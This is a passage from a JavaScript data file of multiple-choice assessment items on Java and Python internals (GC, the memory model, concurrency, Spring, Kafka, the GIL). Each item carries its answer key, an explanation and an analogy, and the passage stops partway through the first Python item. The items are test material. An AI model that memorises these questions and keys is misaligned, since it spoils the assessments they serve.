// ============================================================================
// FAANG-STANDARD ENROLLMENT & FINAL ASSESSMENT DATA ENGINE
// 50 VERY HARD MCQs (25 Java + 25 Python) + 10 HARD FAANG CODING CHALLENGES
// + 25 COMPREHENSIVE FINAL ASSESSMENT CAPSTONE QUESTIONS
// ============================================================================

export const FAANG_ENROLLMENT_MCQS = [
  // --------------------------------------------------------------------------
  // JAVA CORE, JVM, MEMORY MODEL & CONCURRENCY (25 HARD FAANG QUESTIONS)
  // --------------------------------------------------------------------------
  {
    id: 'j-mcq-1',
    track: 'java',
    category: 'JVM Memory & Garbage Collection',
    company: 'Google',
    difficulty: 'Hard',
    question: 'In Java 17+, during a ZGC (Z Garbage Collector) execution cycle, how does the Load Barrier achieve concurrent reference processing without stopping application threads (STW pause < 1ms)?',
    options: [
      'It freezes mutator threads and copies all live objects using a multi-threaded OS page fault handler.',
      'It intercepts object field reads and tests "colored pointers" (metadata bits in the 64-bit reference address); if the pointer is not "good", it self-heals by resolving the forwarding table before returning the reference to the thread.',
      'It leverages the CPU hardware transactional memory (RTM) to atomically re-point all object headers during context switching.',
      'It forces all object references into Metaspace and updates them via a JVM-wide lock.'
    ],
    correctIndex: 1,
    explanation: 'ZGC uses Colored Pointers (allocating 4 bits of a 64-bit pointer for metadata like Marked0, Marked1, Remapped) and JIT-compiled Load Barriers. When application code reads an object reference (`obj.field`), the load barrier checks the color bits. If the reference is pointing to an old address in an evacuated page, the barrier looks up the forwarding table, updates the reference in-place (self-healing), and returns the new object address, keeping STW pauses sub-millisecond.',
    analogy: 'Imagine a courier delivering letters to a student who moved to a new hostel room. When the courier looks at the old room number on the envelope, the hostel guard immediately updates the address sticker on the letter right at the gate so the courier never has to wait for a hostel-wide roll call!'
  },
  {
    id: 'j-mcq-2',
    track: 'java',
    category: 'Java Concurrency & Memory Model',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'Under the Java Memory Model (JMM), which sequence guarantees a happens-before relationship between two threads accessing non-volatile variable `x`?',
    options: [
      'Thread 1 assigns `x = 42;` then `notifyAll()`. Thread 2 calls `wait()` and then reads `x`.',
      'Thread 1 writes `x = 42;` then writes to volatile variable `v`. Thread 2 reads volatile variable `v` (seeing Thread 1\'s write) and subsequently reads `x`.',
      'Thread 1 yields via `Thread.yield()` after writing `x = 42;` and Thread 2 sleeps for 10ms before reading `x`.',
      'Thread 1 sets thread priority to MAX_PRIORITY, writes `x = 42;`, and Thread 2 runs with MIN_PRIORITY.'
    ],
    correctIndex: 1,
    explanation: 'According to JSR-133: A write to a volatile variable happens-before every subsequent read of that same volatile variable. By the transitivity rule: Thread 1\'s write to `x` happens-before Thread 1\'s volatile write to `v`. Since Thread 2 reads `v` (seeing that write), and Thread 2\'s read of `v` happens-before Thread 2\'s read of `x`, Thread 2 is guaranteed to observe `x = 42`.',
    analogy: 'Think of the volatile variable as an official timestamped noticeboard. When Thread 1 finishes writing homework in a diary (`x=42`) and stamps the noticeboard (`v=true`), Thread 2 checking that stamp is legally guaranteed that the diary already contains the finished homework.'
  },
  {
    id: 'j-mcq-3',
    track: 'java',
    category: 'Java Concurrency & Synchronization',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'What is the exact distinction between `ReentrantLock` in fair mode vs non-fair mode under heavy thread contention in a high-throughput payment engine?',
    options: [
      'Fair mode locks memory pages using Linux kernel mutexes; non-fair mode operates purely inside user-space spinlocks.',
      'Fair mode guarantees FIFO acquisition based on arrival order in the wait queue, avoiding starvation at the expense of lower throughput due to frequent thread park/unpark context switching; non-fair mode permits barging where arriving active threads can acquire the lock immediately if released, significantly boosting throughput.',
      'Non-fair mode allows deadlocks to resolve automatically by aborting the longest running transaction.',
      'Fair mode requires double-locking on the object monitor, while non-fair uses single CPU CAS instructions.'
    ],
    correctIndex: 1,
    explanation: 'In `NonfairSync`, an arriving thread calls CAS (`compareAndSetState(0, 1)`) before enqueueing. If the lock was just released, the arriving thread can "barge" in and take it, avoiding the massive CPU penalty of parking and unparking a suspended thread from the CLH queue. In `FairSync`, `hasQueuedPredecessors()` forces the thread to join the queue if earlier threads exist.',
    analogy: 'Fair mode is like a strict college canteen line: even if the counter is empty for half a second while the next person walks up, you must wait behind everyone. Non-fair mode lets someone standing right at the counter grab the plate immediately if it is ready, serving 5x more hungry students per minute!'
  },
  {
    id: 'j-mcq-4',
    track: 'java',
    category: 'Virtual Threads & Project Loom',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'In Java 21, what causes a Virtual Thread to become "pinned" to its underlying platform carrier thread, hindering Loom\'s scalability benefits?',
    options: [
      'Executing any database query over JDBC with non-blocking socket reads.',
      'Executing blocking operations inside a `synchronized` block or method, or calling a foreign JNI C-library native function.',
      'Allocating more than 64KB of byte array buffers on the young generation heap.',
      'Using `CompletableFuture.supplyAsync()` without an explicit ThreadPoolExecutor.'
    ],
    correctIndex: 1,
    explanation: 'Virtual threads unmount from carrier threads when blocking on java.util.concurrent locks or IO. However, in Java 21, when a virtual thread enters a `synchronized` monitor or native JNI method, the JVM cannot unmount its call frame from the OS carrier thread stack. This "pinning" blocks the carrier thread, preventing other virtual threads from running on that core.',
    analogy: 'A virtual thread is like a student working on an online quiz in an open computer lab. Usually, if they wait for a download, they free the seat for someone else. But if they physically superglue themselves to the desk (synchronized block), no other student can use that workstation until they finish!'
  },
  {
    id: 'j-mcq-5',
    track: 'java',
    category: 'Spring Framework & AOP Internals',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'Why does invoking `@Transactional public void updateBalance()` directly from another method inside the same `@Service` class fail to initiate a database transaction?',
    options: [
      'Spring Boot disables transactions for void return types by default.',
      'Spring AOP utilizes dynamic proxies (CGLIB or JDK dynamic proxies) that intercept external incoming calls; internal `this.updateBalance()` calls bypass the proxy and invoke the raw target instance directly.',
      'Database connection pools require distinct thread local tokens per method signature.',
      'The Java compiler inlines methods with identical access modifiers at compile time.'
    ],
    correctIndex: 1,
    explanation: 'Spring AOP wraps beans in proxy objects. When an external caller invokes a method on the proxy, the proxy\'s `TransactionInterceptor` starts a transaction and delegates to the target. But a self-invocation (`this.method()`) is executed on the underlying target instance without passing through the proxy wrapper, causing transactional advice to be completely bypassed.',
    analogy: 'The Spring proxy is like the security guard at the university entrance who inspects your ID card (`@Transactional`). If you enter from outside, the guard checks you. But if you walk from classroom A to classroom B inside the building, you never pass the entrance guard!'
  },
  {
    id: 'j-mcq-6',
    track: 'java',
    category: 'Java Generics & Type Erasure',
    company: 'Google',
    difficulty: 'Hard',
    question: 'What happens at bytecode level when compiling `List<? extends Number> list = new ArrayList<Integer>();` and why does `list.add(10)` result in a compile-time error?',
    options: [
      'The generic type parameter is converted to `Object` and runtime type checks throw `ArrayStoreException`.',
      'Type erasure replaces `? extends Number` with `Number`, but because the compiler cannot determine the exact concrete subtype at runtime (it could be a `List<Double>` or `List<Float>`), it marks the collection as producer-only (PECS: Producer Extends, Consumer Super) and forbids inserting any object other than `null`.',
      'The JVM allocates a polymorphic array that only accepts primitives.',
      'The Java bytecode verifier restricts writes to prevent Metaspace pollution.'
    ],
    correctIndex: 1,
    explanation: 'Under the PECS rule (Producer Extends, Consumer Super), `? extends T` represents a covariant type. The list could actually be an instance of `List<BigDecimal>` or `List<Double>`. Allowing `list.add(Integer.valueOf(10))` would violate type safety if the real underlying list held Doubles. Hence the compiler prohibits any write except literal `null`.',
    analogy: 'Imagine a box labeled "Box of some unknown pet animal (Dog, Cat, or Hamster)". You can safely take an animal out and know it is a Pet. But you cannot blindly throw a Pitbull inside because the box might actually be a fragile Hamster sanctuary!'
  },
  {
    id: 'j-mcq-7',
    track: 'java',
    category: 'JVM Internals & Classloading',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'In standard JVM classloader delegation hierarchy, what breaks the parent-first delegation model in modern OSGi containers and web application containers like Tomcat?',
    options: [
      'JVM security manager revoking `ClassLoaderPermission("loadClass")`.',
      'Child-first (parent-last) classloading where the WebAppClassLoader searches its own `/WEB-INF/classes` and `/WEB-INF/lib` JARs before delegating to the Common/System ClassLoader.',
      'Direct byte injection into the Bootstrap classloader via Unsafe API.',
      'Dynamic proxy generation through ByteBuddy at runtime.'
    ],
    correctIndex: 1,
    explanation: 'Tomcat\'s `WebappClassLoader` overrides the standard delegation order for non-JVM classes: it checks its local repositories first before delegating upwards. This allows isolated web applications to bundle their own versions of third-party libraries (e.g., Jackson 2.15) without conflicting with the container\'s shared libraries.',
    analogy: 'Usually you ask your university central library first before buying a book. But in hostel rooms (Webapp container), students check their own private study desk first for their textbook edition so they do not get stuck with the dean\'s ancient syllabus copy!'
  },
  {
    id: 'j-mcq-8',
    track: 'java',
    category: 'Java Stream API & Performance',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'What is the performance hazard of executing `list.parallelStream().filter(...).findFirst()` on an ordered collection with 100,000,000 elements in Java?',
    options: [
      'It deadlocks the common `ForkJoinPool` because `findFirst` is an inherently blocking primitive.',
      '`findFirst()` is constrained by encountering order; even if worker threads in upper partitions find matches rapidly, the stream must coordinate and wait to ensure the absolute first element in the original sequential order is returned, causing thread synchronization overhead compared to `findAny()`.',
      'Parallel streams disable JIT compilation for lambda predicates.',
      'It creates 100,000,000 thread objects, overflowing JVM thread stack memory.'
    ],
    correctIndex: 1,
    explanation: 'For ordered streams, `findFirst()` requires significant cross-worker synchronization to enforce encounter order: if a worker processing elements 50,000 to 100,000 finds a match, it cannot immediately complete because an earlier thread processing elements 0 to 50,000 might find a match. Using `findAny()` eliminates this barrier, returning the first result found by any active core.',
    analogy: 'If 4 students split a 1000-page book to find a typo, `findAny` lets the first student who spots any typo shout "Found it!" immediately. `findFirst` forces all students to wait and verify whether student #1 found a typo on page 5 before student #4\'s page 900 typo can be accepted!'
  },
  {
    id: 'j-mcq-9',
    track: 'java',
    category: 'Java Memory Leaks & GC Roots',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'Why does an unremoved `ThreadLocal` variable inside a Java application deployed to a servlet container (like Tomcat or Jetty) cause a critical memory leak leading to `java.lang.OutOfMemoryError: Metaspace`?',
    options: [
      'ThreadLocal values are allocated directly in off-heap direct memory buffers that the Garbage Collector cannot reclaim.',
      'Servlet containers reuse worker threads across HTTP requests. The thread\'s `ThreadLocalMap` retains strong references to the `ThreadLocal` value and its class, preventing the application\'s `WebappClassLoader` and all its loaded classes from being garbage collected upon undeploy/redeploy.',
      'The Garbage Collector ignores any thread that has served more than 1,000 HTTP requests.',
      'ThreadLocal objects bypass generational GC and are promoted directly into the Old Generation permanent allocation lock.'
    ],
    correctIndex: 1,
    explanation: 'Servlet container threads live for the lifetime of the JVM. A thread\'s `threadLocals` map holds an entry where the key is a WeakReference to the ThreadLocal, but the value is a strong reference. That value was loaded by `WebappClassLoader`. Because the thread persists across redeployments, the strong reference prevents the classloader from being collected, pinning all classes, static fields, and Metaspace metadata.',
    analogy: 'A worker thread is like a taxi that never retires. If a passenger leaves a heavy forgotten suitcase in the trunk (ThreadLocal), every time the taxi takes a new passenger, the old suitcase remains locked inside until the trunk bursts open!'
  },
  {
    id: 'j-mcq-10',
    track: 'java',
    category: 'High Performance & Low Latency',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'In low-latency Java systems (e.g. LMAX Disruptor), what is the purpose of cache-line padding around sequence counter variables?',
    options: [
      'To prevent OutOfMemory errors when the counter reaches `Long.MAX_VALUE`.',
      'To prevent "false sharing" where variables modified by different CPU cores reside on the same 64-byte L1/L2/L3 cache line, causing frequent invalidation and cache coherency snooping (MESI protocol traffic).',
      'To allow the JVM to automatically vectorize operations with AVX-512 SIMD instructions.',
      'To force the OS kernel to pin the thread to Core 0.'
    ],
    correctIndex: 1,
    explanation: 'Modern x86/ARM processors load memory into caches in 64-byte cache lines. If core A modifies variable `x` and core B modifies variable `y`, but both lie on the same 64-byte boundary, the MESI protocol marks the entire line as INVALID on the other core. Padding adds unused dummy long fields (7 longs before and after) to guarantee the critical variable occupies its own dedicated cache line.',
    analogy: 'Imagine two students sitting in adjacent desks sharing one long sheet of carbon copy paper. Every time student A writes, the whole paper vibrates, forcing student B to pause their pen. Giving each student their own desk (cache padding) lets both write at maximum speed simultaneously!'
  },
  {
    id: 'j-mcq-11',
    track: 'java',
    category: 'Java Concurrency Primitives',
    company: 'Google',
    difficulty: 'Hard',
    question: 'How does `LongAdder` outperform `AtomicLong` by orders of magnitude under high write contention across dozens of CPU cores?',
    options: [
      'By replacing atomic CAS operations with software transactional memory and file locks.',
      'By maintaining a base value and dynamically expanding a `Cell` array striped across thread hash codes; threads perform CAS on separate cells, eliminating CAS spin contention on a single memory location until `sum()` aggregates them.',
      'By compiling down to GPU compute shaders at runtime.',
      'By queuing write requests in an asynchronous ring buffer and writing to disk in batches.'
    ],
    correctIndex: 1,
    explanation: 'Under high contention, thousands of threads competing for one `AtomicLong` cause repeated CAS failures and CPU-burning spin loops. `LongAdder` maintains an array of `Cell` objects padded to avoid false sharing. Each thread hashes to a specific cell and increments it without interfering with other threads. The total sum is lazily aggregated during `sum()`.',
    analogy: 'Instead of 500 college students trying to swipe a single cafeteria card scanner one-by-one (AtomicLong bottleneck), the cafeteria installs 10 parallel scanners (LongAdder cells). At the end of lunch, the manager simply sums the 10 counter numbers together!'
  },
  {
    id: 'j-mcq-12',
    track: 'java',
    category: 'Spring Boot & Microservices Resilience',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'In Resilience4j / Spring Cloud Circuit Breaker, what is the exact trigger that transitions a circuit breaker from `HALF_OPEN` state to `CLOSED` state?',
    options: [
      'The expiration of the `waitDurationInOpenState` timer regardless of request outcomes.',
      'A configurable number of consecutive probe requests (`permittedNumberOfCallsInHalfOpenState`) must be evaluated, and their failure rate must remain below the `failureRateThreshold`.',
      'The downstream microservice must send an explicit JMX heartbeat signal to the caller.',
      'The system administrator manually triggers a REST management actuator endpoint.'
    ],
    correctIndex: 1,
    explanation: 'In `HALF_OPEN` state, the circuit breaker allows a small test batch of traffic (`permittedNumberOfCallsInHalfOpenState`, e.g. 10 requests). If the percentage of failures in this test ring buffer is strictly below `failureRateThreshold` (e.g. < 50%), the breaker assumes the downstream service has recovered and transitions back to `CLOSED`. If it fails, it returns to `OPEN`.',
    analogy: 'After a power outage tripped the building fuse (OPEN), the technician does not immediately turn on all 50 air conditioners. They turn on 2 test bulbs (HALF-OPEN). If the test bulbs work without flickering, the main breaker is closed (CLOSED); if they pop, the breaker trips back OPEN!'
  },
  {
    id: 'j-mcq-13',
    track: 'java',
    category: 'Java Reflection & Deep Internals',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'In Java 9+ Module System (JPMS), what happens when a library executes `field.setAccessible(true)` on a private field of a class in package `java.lang` without any JVM flags?',
    options: [
      'The JVM silently succeeds and disables all garbage collection on the target object.',
      'An `InaccessibleObjectException` is thrown because Java modules strongly encapsulate internal packages unless explicitly opened via `--add-opens java.base/java.lang=ALL-UNNAMED`.',
      'The compiler rewrites the bytecode to use `sun.misc.Unsafe` automatically.',
      'The reflection call succeeds with a permanent entry in Metaspace logs.'
    ],
    correctIndex: 1,
    explanation: 'JPMS strictly encapsulates non-exported or un-opened packages. In modern LTS releases (Java 17+), illegal reflective access is denied by default (`--illegal-access=deny` is permanent). Attempting to open internal JDK classes via reflection throws `java.lang.reflect.InaccessibleObjectException`.',
    analogy: 'In the old hostel days, you could peek into any professor\'s office if you had a master skeleton key (setAccessible). Under new university rules (JPMS), master keys are confiscated, and you get an immediate security citation unless the dean issued a formal gate pass (--add-opens)!'
  },
  {
    id: 'j-mcq-14',
    track: 'java',
    category: 'Database & JPA / Hibernate',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'In Spring Data JPA / Hibernate, what is the primary structural root cause of the "N+1 Query Problem" and which solution completely eliminates it while avoiding Cartesian product explosion?',
    options: [
      'Using JDBC batching; solve by switching to NoSQL MongoDB.',
      'Lazy loading on `@OneToMany` collections executes 1 initial query for N parent entities, then N subsequent queries for their children; solved via `JOIN FETCH` or `@EntityGraph(attributePaths = {"..."})` combined with separate query batches.',
      'Having database foreign keys without cascading deletes.',
      'Configuring `spring.jpa.hibernate.ddl-auto=update` in production environments.'
    ],
    correctIndex: 1,
    explanation: 'Fetching 100 User records executes 1 SQL query. When iterating over each user to get their orders with default Lazy loading, Hibernate issues 100 extra individual queries (1 + 100 = 101 queries). Using `JOIN FETCH` fetches both in a single query. To avoid massive Cartesian duplicate rows when fetching multiple collections, Hibernate Batch Fetching (`hibernate.default_batch_fetch_size=50`) or dual EntityGraphs are standard.',
    analogy: 'Imagine ordering 100 meals for a hostel party. The waiter first brings 100 empty plates (1 query), then makes 100 individual round trips back to the kitchen to deliver one bowl of dal per plate (N queries)! An EntityGraph is a catering trolley that delivers all plates and dishes together in one single trip!'
  },
  {
    id: 'j-mcq-15',
    track: 'java',
    category: 'Java Collections & Hash Collision',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'In Java 8+, when an individual bucket in a `HashMap` exceeds 8 entries (`TREEIFY_THRESHOLD`) and table capacity is >= 64, what data structure replaces the linked list and what are its asymptotic complexities?',
    options: [
      'A SkipList with O(log N) lookup and O(N) space.',
      'A Red-Black balanced binary search tree (`TreeNode`), reducing worst-case search complexity from O(N) to O(log N) to mitigate Hash DoS collision attacks.',
      'A B+ Tree with page size 4KB optimized for SSD storage.',
      'A dynamic Bloom filter with O(1) probabilistic lookup.'
    ],
    correctIndex: 1,
    explanation: 'When multiple keys collide in the same hash bucket, Java 8 converts the bucket\'s linked list into a Red-Black Tree if bucket length >= 8 and total map capacity >= 64. If entries decrease below `UNTREEIFY_THRESHOLD` (6), it converts back to a linked list. This eliminates malicious Hash DoS attacks where attackers submit crafted colliding keys to force O(N^2) CPU degradation.',
    analogy: 'If 8 students all share the exact same roll-number locker, digging through a tangled pile of 8 coats takes forever (O(N)). The warden organizes the coats onto labeled multi-tier hanger branches (Red-Black Tree), allowing anyone to find their jacket in 3 swift checks (O(log N))!'
  },
  {
    id: 'j-mcq-16',
    track: 'java',
    category: 'JVM Execution & JIT Compilation',
    company: 'Google',
    difficulty: 'Hard',
    question: 'What is "Escape Analysis" in the HotSpot C2 JIT compiler and which major optimization does it unlock?',
    options: [
      'It identifies deadlocks and terminates the thread with lowest priority.',
      'It determines if an object allocated inside a method escapes the calling scope or thread; if it does not escape, the JIT can perform Scalar Replacement (allocating fields directly into CPU registers or stack frames, bypassing heap allocation entirely) and Lock Elimination.',
      'It encrypts outgoing TCP socket bytes before sending to network interface cards.',
      'It forces all String objects to reside in the CPU L1 cache.'
    ],
    correctIndex: 1,
    explanation: 'HotSpot analyzes the reachability of allocated objects. If an object does not escape the method (is not returned, stored in a field, or passed to an un-inlined method), the JIT compiler decomposes the object into its primitive fields (Scalar Replacement) and stores them in CPU registers or on the call stack. This achieves zero heap allocation overhead and eliminates garbage collection pressure.',
    analogy: 'If you need a rough calculation scrap paper during an exam that you will immediately crumble and throw away before leaving your desk, you do not register it in the university archive vaults (Heap). You scribble it on the corner of your own exam paper (Stack/Registers) and leave zero mess behind!'
  },
  {
    id: 'j-mcq-17',
    track: 'java',
    category: 'Java Concurrency & Coordination',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'What is the key architectural difference between `CountDownLatch` and `CyclicBarrier` in multi-threaded workflows?',
    options: [
      'CountDownLatch uses OS kernel locks, while CyclicBarrier uses atomic integers.',
      'CountDownLatch is a one-shot countdown that cannot be reset once it reaches zero; CyclicBarrier can be reused repeatedly across multiple phases and allows threads to wait for each other at a mutual barrier point before executing an optional barrier action.',
      'CyclicBarrier can only synchronize exactly two threads, while CountDownLatch synchronizes unlimited threads.',
      'CountDownLatch throws InterruptedException; CyclicBarrier is immune to thread interruption.'
    ],
    correctIndex: 1,
    explanation: 'A `CountDownLatch` cannot be reset; once `countDown()` drops the latch to 0, all waiting threads proceed and subsequent calls have no effect. A `CyclicBarrier` is designed for cyclic parallel algorithms: when all N parties call `await()`, an optional `Runnable` action executes, the barrier trips open, and it automatically resets for the next computational cycle.',
    analogy: 'CountDownLatch is a rocket launch countdown: 3.. 2.. 1.. Liftoff! You cannot reverse the launch. CyclicBarrier is a campus shuttle bus: it waits until exactly 20 students board, drives them to the next building, drops them off, and returns to wait for the next 20 students!'
  },
  {
    id: 'j-mcq-18',
    track: 'java',
    category: 'Distributed Systems & Microservices',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'In high-scale event-driven microservices using Apache Kafka and Spring Cloud Stream, what is the primary risk of configuring `acks=all` (`-1`) with `min.insync.replicas=1`?',
    options: [
      'Producer requests will always time out due to infinite retry loops.',
      'If the partition leader is the only in-sync replica and crashes immediately after acknowledging the producer write, the un-replicated message is permanently lost despite the producer receiving an ack.',
      'Kafka brokers will run out of file descriptors within 60 seconds.',
      'Consumer groups will read the message multiple times simultaneously.'
    ],
    correctIndex: 1,
    explanation: '`acks=all` means the leader will wait for the full set of in-sync replicas specified by `min.insync.replicas`. If `min.insync.replicas` is configured as 1, the leader only waits for itself! If all follower replicas have fallen behind or disconnected, the leader accepts the write and immediately confirms to the producer. If that broker hardware crashes before followers sync, data loss occurs.',
    analogy: 'Imagine a committee rule saying "All available committee members must sign the approval". But if the minimum required member count is set to just 1 person, the president can sign alone while everyone else is asleep. If the president loses the paper on the way home, there is no backup copy anywhere!'
  },
  {
    id: 'j-mcq-19',
    track: 'java',
    category: 'Modern Java & Pattern Matching',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'In Java 21, what compile-time advantage do `sealed` classes and interfaces provide when used with `switch` pattern matching expressions?',
    options: [
      'They prevent child classes from implementing `java.io.Serializable`.',
      'Exhaustiveness checking: The Java compiler verifies that all permitted subclasses are covered by the switch arms, eliminating the requirement for a boilerplate `default` branch.',
      'They force all permitted subclasses to be instantiated as singletons.',
      'They inline all method calls using dynamic invokedynamic call sites.'
    ],
    correctIndex: 1,
    explanation: 'With a `sealed interface Shape permits Circle, Square, Triangle`, the compiler knows the closed finite set of permitted subtypes. When writing `switch (shape) { case Circle c -> ...; case Square s -> ...; case Triangle t -> ...; }`, the compiler proves exhaustiveness at compile time, eliminating the need for a dead `default` branch and catching missing cases if a new permitted type is added.',
    analogy: 'If the college mess menu has a sealed rule permitting exactly 3 lunch options: North Indian, South Indian, or Continental. When taking orders, the cashier does not need an "Other / Mystery Food" category because all legally permitted options are accounted for!'
  },
  {
    id: 'j-mcq-20',
    track: 'java',
    category: 'Garbage Collection & Memory Tuning',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'What is the primary indicator of "Premature Promotion" in Java Garbage Collection telemetry, and what is its standard tuning remediation?',
    options: [
      'Metaspace reaching 100% capacity; remediation is increasing `-XX:MaxMetaspaceSize`.',
      'Short-lived transient objects overflowing the Survivor spaces and being promoted directly into the Old Generation, causing frequent expensive Old GC (Major/Full GC); remediation is sizing Survivor spaces appropriately (`-XX:SurvivorRatio`) or adjusting `-XX:MaxTenuringThreshold`.',
      'Thread stack depth exceeding 1024 frames; remediation is `-Xss2m`.',
      'Direct byte buffer native memory leaks; remediation is disabling `-XX:+DisableExplicitGC`.'
    ],
    correctIndex: 1,
    explanation: 'If the Young Generation Survivor spaces (S0/S1) are too small, survivor space capacity overflows during Eden collection. Objects that are about to die within a few milliseconds are prematurely promoted into the Old Generation before their time. This rapidly pollutes the Old Gen and triggers frequent, stop-the-world Full GCs. Increasing Eden/Survivor sizes keeps short-lived objects in young gen where reclamation is cheap.',
    analogy: 'Young generation is college hostel dorms, Old generation is senior faculty housing. If the student hostel runs out of beds for one night, you accidentally give freshers permanent senior faculty apartments! Soon the faculty housing is completely cluttered with temporary student clutter!'
  },
  {
    id: 'j-mcq-21',
    track: 'java',
    category: 'Core Java Bytecode & Invocation',
    company: 'Google',
    difficulty: 'Hard',
    question: 'Which JVM bytecode instruction was specifically introduced in Java 7 to support dynamic languages and subsequently became the foundational engine for Java 8+ lambdas and string concatenation?',
    options: [
      '`invokevirtual`',
      '`invokespecial`',
      '`invokedynamic`',
      '`invokeinterface`'
    ],
    correctIndex: 2,
    explanation: '`invokedynamic` (Indy) was added in JSR-292. Instead of hardcoding the method linkage at compile time, `invokedynamic` delegates linkage to a Bootstrap Method (BSM) that returns a `CallSite` with a `MethodHandle`. For lambdas, `LambdaMetafactory.metafactory` generates the functional interface instance at runtime without generating bloated `.class` files on disk.',
    analogy: 'Older invocation instructions are like a fixed rail track laid down at factory build time. `invokedynamic` is a smart automated rail switch that can decide where the train tracks connect the very first time the train rolls over it, optimizing performance on the fly!'
  },
  {
    id: 'j-mcq-22',
    track: 'java',
    category: 'Concurrency & ForkJoinPool',
    company: 'Meta',
    difficulty: 'Hard',
    question: 'How does the work-stealing algorithm in Java\'s `ForkJoinPool` prevent thread contention when a worker thread steals a subtask from another worker\'s queue?',
    options: [
      'By acquiring a global reentrant lock across all worker thread queues.',
      'Worker threads process their own local work-queue as a LIFO stack (popping from the head for cache locality), while idle thief threads steal tasks from the opposite end (FIFO from the tail), minimizing CAS contention between owner and thief.',
      'By converting all tasks into native Linux signals.',
      'By spawning a temporary helper thread for every stolen task.'
    ],
    correctIndex: 1,
    explanation: 'Each worker thread in a ForkJoinPool has its own double-ended queue (deque). The worker pushes and pops subtasks from the head (LIFO), which optimizes CPU cache locality for recursive divide-and-conquer tasks. When an idle thread has no work, it steals from the tail (FIFO) of another thread\'s deque. Because the owner operates at the head and the thief operates at the tail, contention is nearly zero.',
    analogy: 'Imagine chefs with their own stack of order tickets. Each chef takes new urgent orders from the top of their own pile. If an idle chef needs work, they quietly take an old order from the very bottom of another chef\'s pile without bumping elbows!'
  },
  {
    id: 'j-mcq-23',
    track: 'java',
    category: 'Network IO & Netty Architecture',
    company: 'Amazon',
    difficulty: 'Hard',
    question: 'In Netty / Spring WebFlux asynchronous architectures, what catastrophic issue occurs if an engineer executes a blocking JDBC call or `Thread.sleep()` inside an EventLoop thread handler?',
    options: [
      'The OS kernel terminates the TCP connection with a RST packet.',
      'The single EventLoop thread is blocked, freezing request handling for hundreds or thousands of other concurrent client connections multiplexed onto that same EventLoop thread.',
      'Netty automatically clones the EventLoop thread into 100 worker threads.',
      'Garbage collector pauses increase by 500% due to thread pinning.'
    ],
    correctIndex: 1,
    explanation: 'Netty uses an EventLoop model (typically 2x CPU cores). Each EventLoop thread handles non-blocking IO for thousands of open TCP socket channels via an epoll selector. If code blocks an EventLoop thread with synchronous IO (`Thread.sleep()`, synchronous DB call), the selector loop cannot tick, causing all other connections assigned to that core to freeze completely.',
    analogy: 'If the lone subway token cashier stops serving passengers to read an entire 300-page novel at the ticket counter window, the entire queue of 5,000 commuters behind the window misses their morning train!'
  },
  {
    id: 'j-mcq-24',
    track: 'java',
    category: 'Java Security & Cryptography',
    company: 'Netflix',
    difficulty: 'Hard',
    question: 'Why is comparing user-supplied authentication tokens or HMAC signatures using standard `Arrays.equals()` or `String.equals()` a critical security vulnerability, and how does `MessageDigest.isEqual()` fix it?',
    options: [
      '`String.equals()` stores cleartext tokens in the OS swap partition.',
      'Standard equality performs early termination on the first mismatching byte, creating a Timing Attack side-channel where attackers infer characters based on response nanosecond variations; `MessageDigest.isEqual()` runs in constant time regardless of where mismatches occur.',
      '`Arrays.equals()` fails if the token length exceeds 256 bytes.',
      '`MessageDigest.isEqual()` automatically hashes the value with bcrypt.'
    ],
    correctIndex: 1,
    explanation: '`String.equals` compares characters sequentially and returns `false` as soon as it encounters a non-matching character. An attacker measuring HTTP response times down to nanoseconds can brute force byte 0, then byte 1, etc., because a string matching 4 bytes takes longer to reject than a string matching 0 bytes. `MessageDigest.isEqual` always compares every byte (`result |= a[i] ^ b[i]`), taking constant time.',
    analogy: 'If a guard checks your 8-digit secret password and says "Wrong!" instantly when digit 1 is wrong, but pauses for 2 seconds before saying "Wrong!" when digits 1 to 7 are correct, an eavesdropper with a stopwatch will crack your passcode in minutes!'
  },
  {
    id: 'j-mcq-25',
    track: 'java',
    category: 'Spring Boot Microservices & Saga Pattern',
    company: 'Apple',
    difficulty: 'Hard',
    question: 'When implementing a distributed transaction across Payment, Inventory, and Shipping microservices using the Saga Pattern, how does an Orchestrated Saga handle a payment failure after inventory was already reserved?',
    options: [
      'It executes a 2-Phase Commit (2PC) global XA rollback across all database engines.',
      'The centralized Saga Orchestrator detects the payment rejection and dispatches asynchronous Compensating Transactions (e.g. `ReleaseInventoryCommand`) to undo the previously successful local state changes.',
      'It halts all microservices and restarts the Kubernetes deployment pod.',
      'It automatically retries the payment indefinitely until the user bank succeeds.'
    ],
    correctIndex: 1,
    explanation: 'In microservice architectures, 2-Phase Commit (XA) is avoided due to blocking and availability limitations. The Saga pattern executes a sequence of local transactions. If a step fails, the Orchestrator emits compensating transactions in reverse order to semantically undo the committed changes (e.g., releasing reserved items back to available stock).',
    analogy: 'If you booked a flight seat, reserved a hotel room, and then your credit card failed at checkout: the travel agent (Orchestrator) automatically calls the hotel and cancels the reservation (Compensating Transaction) so you are not charged!'
  },

  // --------------------------------------------------------------------------
  // PYTHON CORE, CPYTHON INTERNALS, ASYNCIO & FASTAPI (25 HARD FAANG QUESTIONS)
  // --------------------------------------------------------------------------
  {
    id: 'p-mcq-26',
    track: 'python',
    category: 'CPython GIL & Multithreading',
    company: 'Google',
    difficulty: 'Hard',
    question: 'In CPython, why does running two CPU-bound threads on a modern 16-core processor often execute SLOWER than running the same code sequentially on a single thread?',
    options: [
      'CPython threads are simulated using user-space greenlets that cannot schedule on multi-core hardware.',
      'The Global Interpreter Lock (GIL) allows only one native thread to execute Python bytecode at any moment. On multi-core systems, multiple threads on different cores constantly fight for the GIL mutex, triggering relentless OS thread context switching and cache coherency invalidation without any true CPU concurrency.',
      'Python compilers automatically throttle CPU frequency when detecting multiple threads.',
